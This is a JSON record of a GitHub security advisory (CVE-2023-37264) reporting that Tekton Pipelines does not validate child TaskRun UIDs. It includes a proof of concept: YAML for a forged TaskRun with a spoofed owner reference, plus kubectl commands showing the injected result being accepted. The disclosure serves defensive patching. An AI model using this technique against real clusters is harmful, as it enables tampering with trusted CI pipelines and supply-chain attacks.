{
  "Severity": "LOW",
  "UpdatedAt": "2023-10-05T20:50:30Z",
  "Package": {
    "Ecosystem": "GO",
    "Name": "github.com/tektoncd/pipeline"
  },
  "Advisory": {
    "DatabaseId": 215020,
    "Id": "GSA_kwCzR0hTQS13MmgzLXZ2dnEtM201M84AA0fs",
    "GhsaId": "GHSA-w2h3-vvvq-3m53",
    "References": [
      {
        "Url": "https://github.com/tektoncd/pipeline/security/advisories/GHSA-w2h3-vvvq-3m53"
      },
      {
        "Url": "https://nvd.nist.gov/vuln/detail/CVE-2023-37264"
      },
      {
        "Url": "https://github.com/tektoncd/pipeline/blob/2d38f5fa840291395178422d34b36b1bc739e2a2/pkg/reconciler/pipelinerun/pipelinerun.go#L1358-L1372"
      },
      {
        "Url": "https://pkg.go.dev/github.com/tektoncd/pipeline/pkg/apis/pipeline/v1beta1#ChildStatusReference"
      },
      {
        "Url": "https://github.com/advisories/GHSA-w2h3-vvvq-3m53"
      }
    ],
    "Identifiers": [
      {
        "Type": "GHSA",
        "Value": "GHSA-w2h3-vvvq-3m53"
      },
      {
        "Type": "CVE",
        "Value": "CVE-2023-37264"
      }
    ],
    "Description": "### Summary\nPipelines do not validate child UIDs, which means that a user that has access to create TaskRuns can create their own Tasks that the Pipelines controller will accept as the child Task.\n\nWe should add UID to PipelineRun status and validate that child Run status/results only come from Runs matching the same UID. \n\n### Details\nWhile we [store and validate the PipelineRun's (api version, kind, name, uid) in the child Run's OwnerReference](https://github.com/tektoncd/pipeline/blob/2d38f5fa840291395178422d34b36b1bc739e2a2/pkg/reconciler/pipelinerun/pipelinerun.go#L1358-L1372), we only store (api version, kind, name) in the [ChildStatusReference](https://pkg.go.dev/github.com/tektoncd/pipeline/pkg/apis/pipeline/v1beta1#ChildStatusReference) .\n\nThis means that if a client had access to create TaskRuns on a cluster, they could create a child TaskRun for a pipeline with the same name + owner reference, and the Pipeline controller picks it up as if it was the original TaskRun. This is problematic since it can let users modify the config of Pipelines at runtime, which violates SLSA L2 Service Generated / Non-falsifiable requirements.\n\nI believe this is also true for [TaskRuns -\u003e Pods since it looks like we only lookup by name](https://github.com/tektoncd/pipeline/blob/0b8349b770a76877051c9c790c94bf9ed897c75c/test/pipelinerun_test.go#L992), though I haven't tested this.\n\nIf you have update permissions on tekton resources, you could also perform a similar bypass like this (because it's difficult to distinguish this from a Task retry). For now, I think relying on RBAC is fine and treat update as a privileged role (though we should perhaps update docs to stress this). Create is the most problematic for now. SPIFFE/SPIRE might be able to help with ensuring that only the controller can modify state long term (e.g. sign the expected UIDs?)\n\n### PoC\n\n```yaml\napiVersion: [tekton.dev/v1beta1](http://tekton.dev/v1beta1)\nkind: PipelineRun\nmetadata:\n  name: hello-pr\nspec:\n  pipelineSpec:\n    tasks:\n      - name: task1\n        taskSpec:\n          steps:\n            - name: echo\n              image: [distroless.dev/alpine-base](http://distroless.dev/alpine-base)\n              script: |\n                sleep 60\n      - name: task2\n        runAfter: [task1]\n        taskSpec:\n          steps:\n            - name: echo\n              image: [distroless.dev/alpine-base](http://distroless.dev/alpine-base)\n              script: |\n                echo \"asdf\" \u003e $(results.foo.path)\n          results:\n            - name: foo\n    results:\n      - name: foo\n        value: $(tasks.task2.results.foo)\n```\n\nOnce this is running, grab the PR UID:\n\n```sh\n$ k get pr hello-pr -o json | jq .metadata.uid -r\n```\n\nWhile pipeline is running task 1, start fake task 2:\n\n```yaml\napiVersion: [tekton.dev/v1beta1](http://tekton.dev/v1beta1)\nkind: TaskRun\nmetadata:\n  annotations:\n  labels:\n    [app.kubernetes.io/managed-by](http://app.kubernetes.io/managed-by): tekton-pipelines\n    [tekton.dev/memberOf](http://tekton.dev/memberOf): tasks\n    [tekton.dev/pipeline](http://tekton.dev/pipeline): hello-pr\n    [tekton.dev/pipelineRun](http://tekton.dev/pipelineRun): hello-pr\n    [tekton.dev/pipelineTask](http://tekton.dev/pipelineTask): task2\n  name: hello-pr-task2\n  namespace: default\n  ownerReferences:\n  - apiVersion: [tekton.dev/v1beta1](http://tekton.dev/v1beta1)\n    blockOwnerDeletion: true\n    controller: true\n    kind: PipelineRun\n    name: hello-pr\n    uid: af549647-4532-468b-90c5-29122a408f8d \u003c--- this should be UID of PR fetched in last step\nspec:\n  serviceAccountName: default\n  taskSpec:\n    results:\n    - name: foo\n      type: string\n    steps:\n    - image: [distroless.dev/alpine-base](http://distroless.dev/alpine-base)\n      name: echo\n      resources: {}\n      script: |\n        echo \"zxcv\" \u003e $(results.foo.path)\n```\n\nGet pipeline results - it shows the output of the 2nd injected TaskRun\n\n```\n$ k get pr -o json hello-pr | jq .status.pipelineResults\n[\n  {\n    \"name\": \"foo\",\n    \"value\": \"zxcv\\n\"\n  }\n]\n```\n\n### Impact\n\nThis can be used to trick the Pipeline controller into associating unrelated Runs to the Pipeline, feeding its data through the rest of the Pipeline. This requires access to create TaskRuns, so impact may vary depending on your Tekton setup. **If users already have unrestricted access to create any Task/PipelineRun, this does not grant any additional capabilities**.\n\nWorst case example would be a supply chain attack where a malicious TaskRun triggered from Triggers/Workflows intercepts and replaces a task in a trusted Pipeline.",
    "Origin": "UNSPECIFIED",
    "PublishedAt": "2023-07-07T18:46:19Z",
    "Severity": "LOW",
    "Summary": "Pipelines do not validate child UIDs",
    "UpdatedAt": "2023-11-09T05:01:53Z",
    "WithdrawnAt": "",
    "CVSS": {
      "Score": 3.7,
      "VectorString": "CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:U/C:L/I:L/A:N"
    }
  },
  "Versions": [
    {
      "FirstPatchedVersion": {
        "Identifier": ""
      },
      "VulnerableVersionRange": "\u003e= 0.35.0, \u003c= 0.52.0"
    }
  ]
}